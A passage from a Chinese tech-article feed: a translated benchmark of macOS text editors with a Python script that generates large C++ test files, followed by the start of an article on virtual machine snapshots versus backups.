			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
template = &#39;&#39;&#39;

#include &amp;lt;iostream&amp;gt;

int main() {
    return 0;
}

/*
%s
*/
&#39;&#39;&#39;

string = &#39;abcdefghijklmnopqrstuvwxyz1234567890n&#39;

with open(&#39;test-10k.cpp&#39;, &#39;w&#39;) as f:
    f.write(template % (string * 10000,))

with open(&#39;test-100k.cpp&#39;, &#39;w&#39;) as f:
    f.write(template % (string * 100000,))

with open(&#39;test-1m.cpp&#39;, &#39;w&#39;) as f:
    f.write(template % (string * 1000000,))

with open(&#39;test-10m.cpp&#39;, &#39;w&#39;) as f:
    f.write(template % (string * 10000000,))&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587ad2993b869237519953-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587ad2993b869237519953-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587ad2993b869237519953-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587ad2993b869237519953-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587ad2993b869237519953-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587ad2993b869237519953-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587ad2993b869237519953-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587ad2993b869237519953-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587ad2993b869237519953-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587ad2993b869237519953-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587ad2993b869237519953-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587ad2993b869237519953-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587ad2993b869237519953-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587ad2993b869237519953-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587ad2993b869237519953-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587ad2993b869237519953-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587ad2993b869237519953-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587ad2993b869237519953-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587ad2993b869237519953-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587ad2993b869237519953-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587ad2993b869237519953-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587ad2993b869237519953-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587ad2993b869237519953-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587ad2993b869237519953-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587ad2993b869237519953-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587ad2993b869237519953-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587ad2993b869237519953-27&quot;&gt;27&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587ad2993b869237519953-1&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;&#39;&#39;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587ad2993b869237519953-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587ad2993b869237519953-3&quot;&gt;&lt;span class=&quot;crayon-s&quot;&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587ad2993b869237519953-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587ad2993b869237519953-5&quot;&gt;&lt;span class=&quot;crayon-s&quot;&gt;int main() {&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587ad2993b869237519953-6&quot;&gt;&lt;span class=&quot;crayon-s&quot;&gt;    return 0;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587ad2993b869237519953-7&quot;&gt;&lt;span class=&quot;crayon-s&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587ad2993b869237519953-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587ad2993b869237519953-9&quot;&gt;&lt;span class=&quot;crayon-s&quot;&gt;/*&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587ad2993b869237519953-10&quot;&gt;&lt;span class=&quot;crayon-s&quot;&gt;&lt;span class=&quot;crayon-ta&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;s&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587ad2993b869237519953-11&quot;&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587ad2993b869237519953-12&quot;&gt;&lt;span class=&quot;crayon-s&quot;&gt;*/&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587ad2993b869237519953-13&quot;&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587ad2993b869237519953-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587ad2993b869237519953-15&quot;&gt;
&lt;span class=&quot;crayon-k &quot;&gt;string&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;abcdefghijklmnopqrstuvwxyz1234567890n&#39;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587ad2993b869237519953-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587ad2993b869237519953-17&quot;&gt;
&lt;span class=&quot;crayon-st&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-k &quot;&gt;open&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;test-10k.cpp&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;w&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587ad2993b869237519953-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-k &quot;&gt;string&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587ad2993b869237519953-19&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587ad2993b869237519953-20&quot;&gt;
&lt;span class=&quot;crayon-st&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-k &quot;&gt;open&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;test-100k.cpp&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;w&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587ad2993b869237519953-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-k &quot;&gt;string&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;100000&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587ad2993b869237519953-22&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587ad2993b869237519953-23&quot;&gt;
&lt;span class=&quot;crayon-st&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-k &quot;&gt;open&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;test-1m.cpp&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;w&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587ad2993b869237519953-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-k &quot;&gt;string&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1000000&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587ad2993b869237519953-25&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587ad2993b869237519953-26&quot;&gt;
&lt;span class=&quot;crayon-st&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-k &quot;&gt;open&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;test-10m.cpp&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;w&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587ad2993b869237519953-27&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-k &quot;&gt;string&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10000000&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0058 seconds] --&gt;
&lt;p&gt;&lt;/p&gt;
&lt;h3&gt;Files Open Time 文件打开时间&lt;/h3&gt;
&lt;p&gt;首先打开每种编辑器，加载一个文件。我使用活动监视器 (Activity Monitor) 将所有进程占用的内存加在一起。这个过程中使用的文件是 “文件打开时间” 测试中大小为 370KB 的那个文件。&lt;/p&gt;
&lt;h2&gt;结果&lt;/h2&gt;
&lt;h3&gt;启动时间（单位：秒）&lt;/h3&gt;
&lt;p&gt;&lt;img id=&quot;pic&quot; class=&quot;&quot; src=&quot;/images/jobbole.com/5a5632903a901587c38609d4cabe33fb.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;注：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;TextEdit 在启动的时候并没有打开编辑窗口，而是打开了一个选择文件的窗口。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;窗口打开时间（单位：秒）&lt;/h3&gt;
&lt;p&gt;&lt;img id=&quot;pic&quot; class=&quot;&quot; src=&quot;/images/jobbole.com/16b6afe96509e7da75a40c19d1e3d2be.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;注：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;TextEdit 打开窗口的时候有一个弹出的动画，这会拖慢一点点时间&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;文件打开的时间（单位：秒）&lt;/h3&gt;
&lt;p&gt;&lt;img id=&quot;pic&quot; class=&quot;M_cur_zoom_out&quot; src=&quot;/images/jobbole.com/f5fbc238fabf2c44fe49c487b769420e.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;注：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Atom 打不开“1百万行”的文件，在大约 40 秒后会报告“崩溃”。&lt;/li&gt;
&lt;li&gt;Visual Studio Code 不允许我打开 “1千万行” 的文件，会报 “文件过大”&lt;/li&gt;
&lt;li&gt;Atom 在打开 “10万行” 的文件时不能保持语法高亮。&lt;/li&gt;
&lt;li&gt;Visual Studio Code在打开 “1百万行” 的文件时不能保持语法高亮。&lt;/li&gt;
&lt;li&gt;TextEdit 没有语法高亮功能。&lt;/li&gt;
&lt;li&gt;TextEdit 在打开文件时有一个弹出动画，会拖慢一点点时间。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;内存使用情况（单位：MB）&lt;/h3&gt;
&lt;p&gt;&lt;img id=&quot;pic&quot; class=&quot;&quot; src=&quot;/images/jobbole.com/e17c104c6631cca494b6bc39df844323.jpg&quot;&gt;&lt;/p&gt;
&lt;h2&gt;结论&lt;/h2&gt;
&lt;p&gt;Atom 和 VS Code 的表现相比于 Sublime Text 和 TextEdit 要明显差一些：启动和打开窗口的时间很明显地会慢几秒钟，而且会占用更多的内存。&lt;/p&gt;
&lt;p&gt;在打开文件和 RAM 使用这些方面，Visual Studio Code 要优于 Atom，它能处理更大的文件，而且速度比 Atom 更快。在我测试 3.7MB 的这个文件时，Visual Studio Code 可以在一秒内打开，但是 Atom 要用超过两秒的时间。&lt;/p&gt;
&lt;p&gt;Sublime Text 仍然是速度之王，Visual Studio Code 排第二，Atom 倒数第一。&lt;/p&gt;
&lt;p&gt;题外话：从这个月开始，我要用 Visual Studio Code 来代替 Sublime Text了，Visual Studio Code 看起来更好玩。&lt;/p&gt;

        
            &lt;blockquote class=&quot;rewards&quot;&gt;
        &lt;p&gt;&lt;strong&gt;打赏支持我翻译更多好文章，谢谢！&lt;/strong&gt;&lt;/p&gt;
        &lt;a href=&quot;#rewardbox&quot; id=&quot;rewards-button&quot; class=&quot;fancybox&quot;&gt;&lt;span class=&quot;btn-bluet-blue href-style&quot;&gt;&lt;i class=&quot;fa fa-jpy&quot;&gt;&lt;/i&gt; 打赏译者&lt;/span&gt;&lt;/a&gt;
    &lt;/blockquote&gt;

    &lt;div id=&quot;rewardbox&quot;&gt;
        &lt;h4&gt;打赏支持我翻译更多好文章，谢谢！&lt;/h4&gt;
                
    &lt;/div&gt;

    
        
    &lt;div class=&quot;post-adds&quot;&gt;
        &lt;span data-post-id=&quot;109756&quot; class=&quot; btn-bluet-bigger href-style vote-post-up   register-user-only &quot;&gt;&lt;i class=&quot;fa  fa-thumbs-o-up&quot;&gt;&lt;/i&gt; &lt;h10 id=&quot;109756votetotal&quot;&gt;2&lt;/h10&gt; 赞&lt;/span&gt;
        &lt;span data-book-type=&quot;1&quot; data-site-id=&quot;2&quot; data-item-id=&quot;109756&quot; data-item-type=&quot;1&quot; class=&quot; btn-bluet-bigger href-style bookmark-btn  register-user-only &quot;&gt;&lt;i class=&quot;fa fa-bookmark-o  &quot;&gt;&lt;/i&gt; 3 收藏&lt;/span&gt;

                    &lt;a href=&quot;#article-comment&quot;&gt;&lt;span class=&quot;btn-bluet-bigger href-style hide-on-480&quot;&gt;&lt;i class=&quot;fa fa-comments-o&quot;&gt;&lt;/i&gt; 14 评论&lt;/span&gt;&lt;/a&gt;
        
        
        
        &lt;!-- JiaThis Button BEGIN --&gt;
        &lt;div class=&quot;jiathis_style_24x24&quot; style=&quot;display: inline-flex; position: relative; margin: 0; clear: both;float: right;&quot;&gt;
            &lt;a class=&quot;jiathis_button_tsina&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_weixin&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_qzone&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_fb hide-on-480&quot;&gt;&lt;/a&gt;
            &lt;a href=&quot;http://www.jiathis.com/share?uid=1745061&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
        &lt;/div&gt;

    &lt;/div&gt;




        &lt;!-- BEGIN #author-bio --&gt;

&lt;div id=&quot;author-bio&quot;&gt;
	
	&lt;h3 class=&quot;widget-title&quot;&gt;
	关于作者：&lt;a target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/liuchang&quot;&gt;刘唱&lt;/a&gt;
	&lt;/h3&gt;
	&lt;div class=&quot;alignleft&quot;&gt;
		&lt;a target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/liuchang&quot;&gt;
			&lt;img src=&quot;/images/jobbole.com/f6783ff17c3811e33299c632fe4c3900.jpg&quot;&gt;
		&lt;/a&gt;
	&lt;/div&gt;

    &lt;div class=&quot;author-bio-info&quot;&gt;

        &lt;span class=&quot;author-bio-info-block&quot;&gt;
            数据挖掘研究生        &lt;/span&gt;
        &lt;span class=&quot;author-bio-info-block&quot;&gt;
            &lt;a href=&quot;http://www.jobbole.com/members/liuchang&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt; 个人主页&lt;/a&gt; ·
            &lt;a href=&quot;http://blog.jobbole.com/author/liuchang/&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa fa-file-text-o&quot;&gt;&lt;/i&gt; 我的文章&lt;/a&gt;

             · &lt;a title=&quot;声望值&quot; target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/liuchang/reputation/&quot;&gt;&lt;i class=&quot;fa fa-graduation-cap&quot;&gt;&lt;/i&gt; 18&lt;/a&gt; · &lt;a title=&quot;我的网站&quot; target=&quot;_blank&quot; href=&quot;http://blog.csdn.net/github_36299736&quot;&gt;&lt;i class=&quot;fa fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt; &lt;a title=&quot;微博主页&quot; target=&quot;_blank&quot; href=&quot;http://weibo.com/2577872237&quot;&gt;&lt;i class=&quot;fa fa-weibo&quot;&gt;&lt;/i&gt;&lt;/a&gt; &lt;a title=&quot;个人微信：learningDM&quot; target=&quot;_blank&quot; href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-weixin&quot;&gt;&lt;/i&gt;&lt;/a&gt; &lt;a title=&quot;GitHub主页&quot; target=&quot;_blank&quot; href=&quot;http://github.com/liuchang0719&quot;&gt;&lt;i class=&quot;fa fa-github&quot;&gt;&lt;/i&gt;&lt;/a&gt; &lt;a title=&quot;Facebook主页&quot; target=&quot;_blank&quot; href=&quot;http://www.facebook.com/liuchang0719&quot;&gt;&lt;i class=&quot;fa fa-facebook&quot;&gt;&lt;/i&gt;&lt;/a&gt;         &lt;/span&gt;
    &lt;/div&gt;
	&lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;!-- END #author-bio --&gt;
	

</description>
        <pubDate>Tue, 10 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2017/2017-01-10-109756-d6a905933.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2017/2017-01-10-109756-d6a905933.html</guid>
        
        
        <category>jobbole</category>
        
      </item>
    
      <item>
        <title>虚拟机中的快照和备份之间的区别</title>
        <description>


        			&lt;div class=&quot;textwidget&quot;&gt;
&lt;/div&gt;
		
		&lt;p&gt;虚拟化的术语中，快照和备份普遍被滥用。让我来解释一下虚拟机快照和备份的基本区别。&lt;/p&gt;
&lt;h1&gt;虚拟机快照&lt;/h1&gt;
&lt;p&gt;VMware 和 Hyper-V 的快照，都可以捕获虚机运行状态（开机，关机，中止）、虚机运行产生的数据（虚拟磁盘，内存)和运行中虚拟机的硬件配置（虚拟网卡）。&lt;/p&gt;
&lt;h2&gt;虚拟机如何通过快照恢复？&lt;/h2&gt;
&lt;p&gt;&lt;span style=&quot;background-color: #ffffff;&quot;&gt;虚拟机可以恢复到创建快照的时刻：比如，它可以在内存全部加载完时启动。所有程序的运行状态恢复到创建快照时的状态。这是快照不能被备份替代的原因之一。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;什么时候应该使用快照?&lt;/h2&gt;
&lt;p&gt;创建快照同时会创建一个记录了虚拟机状态变化的一个文件。这对性能有一些影响。基本上，随着镜像越来越多，性能会随之降低。&lt;/p&gt;
